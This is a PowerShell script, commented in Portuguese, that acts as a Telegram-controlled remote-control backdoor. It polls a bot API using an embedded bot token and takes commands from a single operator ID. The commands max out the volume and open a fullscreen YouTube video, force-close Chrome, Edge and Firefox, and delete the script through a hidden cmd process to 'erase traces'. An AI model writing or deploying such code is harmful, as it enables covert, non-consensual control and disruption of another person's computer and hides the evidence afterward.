$token = "8268716558:AAH_sjcx5wfc_Y33KeSGfHv7zek1wsDZ5Z0"
$meuID = "5974171362"
$url = "https://api.telegram.org/bot$token/getUpdates"
$caminhoScript = $MyInvocation.MyCommand.Path # Localiza onde o script está salvo

while($true) {
    try {
        $response = Invoke-RestMethod -Uri $url -UseBasicParsing
        $ultimaMsg = $response.result[-1].message.text
        $quemMandou = $response.result[-1].message.from.id

        if ($quemMandou -eq $meuID) {
            
            # COMANDO 1: EXECUTAR VÍDEO
            if ($ultimaMsg -eq "/video") {
                $obj = New-Object -ComObject WScript.Shell
                for($i=0; $i -le 50; $i++) { $obj.SendKeys([char]175) }
                start "https://www.youtube.com/watch?v=qHoAEWK59nE&list=RDqHoAEWK59nE&index=1"
                Start-Sleep -Seconds 5
                $obj.SendKeys('f')
            }

            # COMANDO 2: FECHAR NAVEGADOR (Chrome, Edge ou Firefox)
            elseif ($ultimaMsg -eq "/fechar") {
                Stop-Process -Name "chrome","msedge","firefox" -Force -ErrorAction SilentlyContinue
            }

            # COMANDO 3: APAGAR TUDO E SAIR (Autodestruição)
            elseif ($ultimaMsg -eq "/limpar") {
                # Avisa que vai sumir
                Invoke-RestMethod -Uri "https://api.telegram.org/bot$token/sendMessage?chat_id=$meuID&text=Apagando rastros e encerrando..."
                
                # Cria um processo separado para deletar o arquivo após o script fechar
                Start-Process cmd.exe -ArgumentList "/c timeout /t 2 && del `"$caminhoScript`"" -WindowStyle Hidden
                exit
            }
        }
    } catch { }
    Start-Sleep -Seconds 5
}

